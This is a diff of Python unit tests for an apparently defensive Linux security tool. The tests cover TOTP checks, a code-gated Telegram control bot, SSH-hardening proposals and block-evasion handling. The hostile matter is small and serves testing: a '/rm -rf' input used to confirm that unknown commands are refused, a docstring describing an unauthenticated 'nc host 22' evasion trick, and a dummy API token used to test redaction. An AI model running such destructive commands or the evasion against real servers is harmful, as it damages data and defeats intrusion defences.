+        self.r.handle({"kind": "login_users", "sev": "high", "target": {"user": "alice@9.9.9.9"},
+                       "detail": "nuevo en login_users: alice@9.9.9.9"}, cfg={})
+        self.r.handle({"kind": "port_scan", "sev": "high", "target": {"ip": "192.168.1.5"},
+                       "detail": "escaneo desde 192.168.1.5 (≥8 puertos)"}, cfg={})
+        with mock.patch.object(recon, "local_ips", lambda: set()):
+            data = forensics.indicators()
+        self.assertEqual(data["ips"], ["8.8.4.4"])  # ni el login ni la IP privada
+        self.assertNotIn("alice", str(data))
+        self.assertEqual(data["attack_kinds"], ["auth_bruteforce", "port_scan"])
+
+
+class TotpTests(unittest.TestCase):
+    def setUp(self):
+        from arx import totp
+        self.t = totp
+        import base64
+        self.secret = base64.b32encode(b"12345678901234567890").decode()
+
+    def test_rfc_6238_vectors(self):
+        for now, code in ((59, "287082"), (1111111109, "081804"), (1234567890, "005924"), (2000000000, "279037")):
+            self.assertEqual(self.t.counter_for(code, self.secret, now), now // 30, now)
+
+    def test_a_wrong_code_does_not_match(self):
+        self.assertIsNone(self.t.counter_for("000000", self.secret, 59))
+
+    def test_one_step_of_clock_drift_is_tolerated_and_no_more(self):
+        self.assertIsNotNone(self.t.counter_for("287082", self.secret, 59 + 30))
+        self.assertIsNone(self.t.counter_for("287082", self.secret, 59 + 90))
+
+    def test_malformed_codes_and_secrets(self):
+        for code in ("", "12345", "1234567", "abcdef", None, 287082):
+            self.assertIsNone(self.t.counter_for(code, self.secret, 59), code)
+        self.assertIsNone(self.t.counter_for("287082", "no-es-base32!", 59))
+
+
+class TelegramTests(unittest.TestCase):
+    """El chat no abre puertos, y quien robe la cuenta de Telegram no puede actuar sobre el servidor."""
+
+    CHAT = 4242
+
+    def setUp(self):
+        _isolate()
+        from arx import config, totp
+        from arx.modules import response, telegram
+        self.c, self.tp, self.r, self.t = config, totp, response, telegram
+        self.secret = totp.new_secret()
+        config.save_secrets({"telegram_bot_token": "T", "telegram_totp": self.secret})
+        self.cfg = {"notify": {"telegram_chat_id": str(self.CHAT), "telegram_interactive": True}}
+        config.save_config(self.cfg)
+        self.now = 1_800_000_000.0
+        self.sent = []
+        self.updates = []
+        p = mock.patch.object(response, "_is_linux_root", lambda: False)
+        p.start()
+        self.addCleanup(p.stop)
+
+    def _code(self, now=None):
+        import base64
+        return self.tp._code(base64.b32decode(self.secret), int((now or self.now) // 30))
+
+    def _post(self, url, payload, timeout=15):
+        if url.endswith("/getUpdates"):
+            out, self.updates = self.updates, []
+            return {"ok": True, "result": out}
+        self.sent.append(payload)
+        return {"ok": True}
+
+    def _msg(self, text, chat=None, uid=1):
+        self.updates.append({"update_id": uid, "message": {"chat": {"id": chat or self.CHAT}, "text": text}})
+
+    def _pending(self):
+        f = {"kind": "integrity", "sev": "high", "detail": "cambió cron", "target": {"file": "cron"}}
+        return self.r.handle(f, cfg={})["pending_id"]
+
+    def _say(self, text):
+        return self.t.handle_text(text, self.cfg, self.now)
+
+    def test_a_stranger_gets_no_answer_at_all(self):
+        self._msg("/estado", chat=666)
+        self.assertEqual(self.t.poll_once(self.cfg, self._post, self.now), 0)
+        self.assertEqual(self.sent, [])
+
+    def test_a_stranger_with_a_valid_code_cannot_act(self):
+        pid = self._pending()
+        self._msg(f"/autorizar {pid} {self._code()}", chat=666)
+        self.t.poll_once(self.cfg, self._post, self.now)
+        self.assertEqual(len(self.r.list_pending()), 1)
+
+    def test_the_owner_gets_an_answer(self):
+        self._msg("/estado")
+        self.assertEqual(self.t.poll_once(self.cfg, self._post, self.now), 1)
+        self.assertEqual(self.sent[0]["chat_id"], self.CHAT)
+        self.assertIn("Esperan tu decisión", self.sent[0]["text"])
+
+    def test_a_message_is_never_handled_twice(self):
+        self._msg("/estado", uid=7)
+        self.t.poll_once(self.cfg, self._post, self.now)
+        self.assertEqual(self.t._load()["offset"], 8)
+
+    def test_acting_without_a_code_does_nothing(self):
+        pid = self._pending()
+        self.assertIn("Uso:", self._say(f"/autorizar {pid}"))
+        self.assertEqual(len(self.r.list_pending()), 1)
+
+    def test_a_wrong_code_does_nothing(self):
+        pid = self._pending()
+        self.assertIn("incorrecto", self._say(f"/autorizar {pid} 000000"))
+        self.assertEqual(len(self.r.list_pending()), 1)
+
+    def test_a_good_code_acts(self):
+        pid = self._pending()
+        self.assertIn("Autorizada", self._say(f"/autorizar {pid} {self._code()}"))
+        self.assertEqual(self.r.list_pending(), [])
+
+    def test_a_code_seen_in_the_chat_history_does_not_work_twice(self):
+        pid = self._pending()
+        code = self._code()
+        self._say(f"/autorizar {pid} {code}")
+        other = self.r.handle({"kind": "integrity", "sev": "high", "detail": "cambió sudoers",
+                               "target": {"file": "sudoers"}}, cfg={})["pending_id"]
+        self.assertIn("ya usado", self._say(f"/autorizar {other} {code}"))
+        self.assertEqual(len(self.r.list_pending()), 1)
+
+    def test_guessing_codes_gets_locked_out(self):
+        pid = self._pending()
+        for _ in range(self.t.MAX_FAILS):
+            self._say(f"/autorizar {pid} 000000")
+        self.assertIn("Demasiados", self._say(f"/autorizar {pid} {self._code()}"))
+        self.assertEqual(len(self.r.list_pending()), 1)
+        later = self.now + self.t.LOCKOUT_S + 1
+        self.assertIn("Autorizada", self.t.handle_text(f"/autorizar {pid} {self._code(later)}", self.cfg, later))
+
+    def test_unlock_from_the_chat(self):
+        self.r._save_blocks([{"fp": "abc", "detail": "d", "expires_at": None,
+                              "revert": {"tool": "usermod", "user": "ana", "uid": 1001, "expire": ""}}])
+        self.assertIn("ana", self._say(f"/desbloquear ana {self._code()}"))
+        self.assertEqual(self.r.locked_accounts(), [])
+
+    def test_accept_from_the_chat_needs_a_code(self):
+        from arx.modules import baseline
+        baseline.save({**baseline.new_baseline(), "sets": {"listen_ports": {}}})
+        o = self.r.handle({"kind": "listen_ports", "sev": "high", "detail": "d", "set": "listen_ports",
+                           "item": "tcp 80 all", "target": {"proto": "tcp", "port": 80, "exposed": "all"}}, cfg={})
+        self.assertIn("Uso:", self._say(f"/aceptar {o['fp']}"))
+        self.assertIn("Aceptado", self._say(f"/aceptar {o['fp']} {self._code()}"))
+
+    def test_changing_mode_needs_a_code_and_takes_effect(self):
+        self.assertFalse(self.t.effective_enforce(False))
+        self.assertIn("incorrecto", self._say("/modo proteger 000000"))
+        self.assertFalse(self.t.effective_enforce(False))
+        self._say(f"/modo proteger {self._code()}")
+        self.assertTrue(self.t.effective_enforce(False))
+        self.assertIn("Uso", self.t.handle_text(f"/modo otro {self._code(self.now + 30)}", self.cfg, self.now + 30))
+
+    def test_the_service_mode_applies_if_nobody_changed_it(self):
+        self.assertTrue(self.t.effective_enforce(True))
+
+    def test_lists_what_waits_for_you(self):
+        self.assertIn("Nada espera", self._say("/pendientes"))
+        pid = self._pending()
+        self.assertIn(pid, self._say("/pendientes"))
+
+    def test_mute_silences_all_but_critical(self):
+        from arx import notify
+        self._say("/callar 2")
+        self.assertTrue(notify.muted(self.now))
+        with mock.patch.object(notify, "muted", lambda now=None: True):
+            self.assertFalse(notify.worth_alerting("high", {}))
+            self.assertTrue(notify.worth_alerting("crit", {}))
+        self.assertIn("Uso", self._say("/callar 999"))
+        self._say("/callar 0")
+        self.assertFalse(notify.muted(self.now))
+
+    def test_free_text_goes_to_the_model_which_cannot_act(self):
+        self.assertIn("Sin modelo", self._say("¿qué tal va todo?"))
+        self.cfg["providers"] = {"anthropic": "m"}
+        self.cfg["fallback_order"] = ["anthropic"]
+        from arx import engine
+        with mock.patch.object(engine.Engine, "ask", lambda s, m, system=None: ("todo en orden", "anthropic")):
+            self.assertEqual(self._say("autorizar abc 123456"), "todo en orden")  # sin "/", no actúa
+
+    def test_unknown_commands_and_empty_text(self):
+        self.assertIn("No conozco", self._say("/rm -rf"))
+        self.assertIn("Comandos", self._say("   "))
+
+    def test_secrets_do_not_leave_in_the_answers(self):
+        self._msg("/hallazgos")
+        self.r.handle({"kind": "gauge", "sev": "low", "detail": "token sk-ant-abcdefghijklmnopqrstuvwxyz0123456789"}, cfg={})
+        self.t.poll_once(self.cfg, self._post, self.now)
+        self.assertNotIn("abcdefghijklmnopqrstuvwxyz0123456789", self.sent[0]["text"])
+
+    def test_a_broken_command_still_answers(self):
+        self._msg("/estado")
+        with mock.patch.object(self.t, "handle_text", side_effect=RuntimeError("boom")):
+            self.t.poll_once(self.cfg, self._post, self.now)
+        self.assertIn("No pude", self.sent[0]["text"])
+
+    def test_it_is_off_unless_fully_configured(self):
+        self.assertTrue(self.t.enabled(self.cfg))
+        self.assertFalse(self.t.enabled({"notify": {"telegram_chat_id": "1"}}))
+        self.c.save_secrets({"telegram_bot_token": "T"})
+        self.assertFalse(self.t.enabled(self.cfg))  # sin TOTP no hay gobierno desde el chat
+
+    def test_setup_detects_the_chat(self):
+        calls = iter([{"result": []}, {"result": [{"message": {"chat": {"id": 99}}}]}])
+        self.assertEqual(self.t.detect_chat_id("T", lambda u, p, timeout=0: next(calls)), "99")
+        self.assertEqual(self.t.bot_name("T", lambda u, p, timeout=0: {"ok": True, "result": {"username": "arx_bot"}}), "arx_bot")
+
+
+class ProposalTests(unittest.TestCase):
+    """Arx propone, tú apruebas. Nunca se aplica solo y nunca te deja fuera."""
+
+    def setUp(self):
+        self.d = _isolate()
+        from arx.modules import proposals, response
+        self.p, self.r = proposals, response
+        self.effective = {"passwordauthentication": "yes", "permitrootlogin": "no"}
+        self.dropin = os.path.join(self.d, "00-arx.conf")
+        test = self
+        for obj, name, value in ((proposals, "_sshd_effective", lambda: dict(test.effective)),
+                                 (proposals, "_includes_dropins", lambda: True),
+                                 (proposals, "_reload_sshd", lambda: True),
+                                 (proposals, "_admin_with_key", lambda: "ana"),
+                                 (proposals, "SSHD_DROPIN", self.dropin)):
+            p = mock.patch.object(obj, name, value)
+            p.start()
+            self.addCleanup(p.stop)
+
+    def _ids(self):
+        return [x["id"] for x in self.p.all_proposals()]
+
+    def test_it_proposes_closing_passwords_and_says_why(self):
+        self.assertEqual(self._ids(), ["ssh-sin-contrasena"])
+        self.r.handle({"kind": "auth_bruteforce", "sev": "high", "detail": "fuerza bruta", "target": {"ip": "8.8.8.8"}}, cfg={})
+        self.assertIn("1 ataque", self.p.all_proposals()[0]["why"])
+
+    def test_nothing_to_propose_if_it_is_already_closed(self):
+        self.effective["passwordauthentication"] = "no"
+        self.assertEqual(self._ids(), [])
+
+    def test_nothing_is_applied_by_listing(self):
+        with mock.patch("sys.stdout"):
+            self.p.run("list")
+        self.assertFalse(os.path.exists(self.dropin))
+
+    def test_apply_writes_it_only_if_sshd_confirms_the_effect(self):
+        self.effective["passwordauthentication"] = "no"  # lo que dirá sshd -T tras escribirlo
+        self.assertTrue(self.p.apply_ssh("ssh-sin-contrasena").startswith("hecho"))
+        self.assertIn("PasswordAuthentication no", open(self.dropin).read())
+
+    def test_if_sshd_does_not_take_it_everything_is_left_as_it_was(self):
+        out = self.p.apply_ssh("ssh-sin-contrasena")  # sshd -T sigue diciendo yes
+        self.assertIn("dejado como estaba", out)
+        self.assertFalse(os.path.exists(self.dropin))
+
+    def test_invalid_config_is_left_as_it_was(self):
+        with mock.patch.object(self.p, "_sshd_effective", lambda: None):
+            self.assertIn("dejado como estaba", self.p.apply_ssh("ssh-sin-contrasena"))
+        self.assertFalse(os.path.exists(self.dropin))
+
+    def test_never_if_it_would_leave_you_out(self):
+        with mock.patch.object(self.p, "_admin_with_key", lambda: None):
+            self.assertIn("te quedarías fuera", self.p.apply_ssh("ssh-sin-contrasena"))
+        self.assertFalse(os.path.exists(self.dropin))
+
+    def test_never_if_it_would_have_no_effect(self):
+        with mock.patch.object(self.p, "_includes_dropins", lambda: False):
+            self.assertEqual(self._ids(), [])
+            self.assertIn("no tendría efecto", self.p.apply_ssh("ssh-sin-contrasena"))
+
+    def test_revert_leaves_the_other_one(self):
+        self.effective = {"passwordauthentication": "no", "permitrootlogin": "without-password"}
+        self.p.apply_ssh("ssh-sin-contrasena")
+        self.p.apply_ssh("ssh-root-sin-contrasena")
+        self.assertTrue(self.p.revert_ssh("ssh-sin-contrasena").startswith("deshecho"))
+        text = open(self.dropin).read()
+        self.assertNotIn("PasswordAuthentication", text)
+        self.assertIn("PermitRootLogin", text)
+        self.p.revert_ssh("ssh-root-sin-contrasena")
+        self.assertFalse(os.path.exists(self.dropin))
+
+    def test_revert_of_something_not_applied(self):
+        self.assertIn("no está aplicada", self.p.revert_ssh("ssh-sin-contrasena"))
+
+    def _old(self, kind="services", sev="med", seen=30, days=5, item="x.service"):
+        first = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
+        self.r._save_findings({"abc": {"kind": kind, "sev": sev, "set": kind, "item": item, "seen": seen, "first_seen": first}})
+
+    def test_what_has_been_around_for_days_is_proposed_as_normal(self):
+        self._old()
+        self.assertIn("abc", self._ids())
+
+    def test_something_recent_or_rare_is_not(self):
+        self._old(days=1)
+        self.assertNotIn("abc", self._ids())
+        self._old(seen=2)
+        self.assertNotIn("abc", self._ids())
+
+    def test_who_gets_in_or_gives_root_is_never_normalized_by_tiredness(self):
+        for kind in ("login_users", "uid0_account", "suid_new", "integrity", "intel_ip"):
+            self._old(kind=kind)
+            self.assertNotIn("abc", self._ids(), kind)
+
+    def test_applying_needs_the_word(self):
+        from arx import config
+        config.save_config({"auth_word": config.hash_word("buena")})
+        with mock.patch("getpass.getpass", lambda p: "mala"), mock.patch("sys.stdout"):
+            self.assertEqual(self.p.run("apply", "ssh-sin-contrasena"), 1)
+        self.assertFalse(os.path.exists(self.dropin))
+
+
+class OperatorEvasionTests(unittest.TestCase):
+    """B29: un `nc host 22` sin autenticar volvía intocable al atacante."""
+
+    def setUp(self):
+        _isolate()
+        from arx.modules import recon, response
+        self.rc, self.r = recon, response
+        for obj, name, value in ((response, "ssh_ports", lambda: {22}), (recon, "local_ips", lambda: {"127.0.0.1"})):
+            p = mock.patch.object(obj, name, value)
+            p.start()
+            self.addCleanup(p.stop)
+
+    def _ips(self, titles, exe="/usr/sbin/sshd"):
+        conns = [{"remote_ip": "198.51.100.7", "state": "ESTABLISHED", "local_port": 22, "exe": exe, "pid": pid}
+                 for pid in titles]
+        with mock.patch.object(self.rc, "connection_owners", lambda: conns), \
+             mock.patch.object(self.r, "_proc_title", titles.get):
+            return self.r._never_block_ips()
+
+    def test_a_connection_that_never_authenticated_protects_nobody(self):
+        for title in ("sshd: [accepted]", "sshd: unknown [priv]", "sshd: unknown [net]", "sshd: root [priv]",
+                      "sshd: root [net]", "sshd: /usr/sbin/sshd -D [listener] 1 of 10-100 startups"):
+            for _ in range(3):
+                self.assertNotIn("198.51.100.7", self._ips({9: title}), title)
+
+    def test_a_real_session_that_persists_is_protected(self):
+        for title in ("sshd: ana@pts/0", "sshd: ana@notty", "sshd-session: ana@pts/3"):
+            self.r.config.write_json(self.r.config.state_dir() / "ssh-peers.json", {})
+            self.assertNotIn("198.51.100.7", self._ips({9: title}), title)  # la primera vez aún no
+            self.assertIn("198.51.100.7", self._ips({9: title}), title)
+
+    def test_the_title_alone_is_not_enough(self):
+        """Cualquier programa puede ponerse ese título: también tiene que ser sshd."""
+        self._ips({9: "sshd: ana@pts/0"}, exe="/tmp/falso")
+        self.assertNotIn("198.51.100.7", self._ips({9: "sshd: ana@pts/0"}, exe="/tmp/falso"))
 
 
 class CritReserveTests(unittest.TestCase):
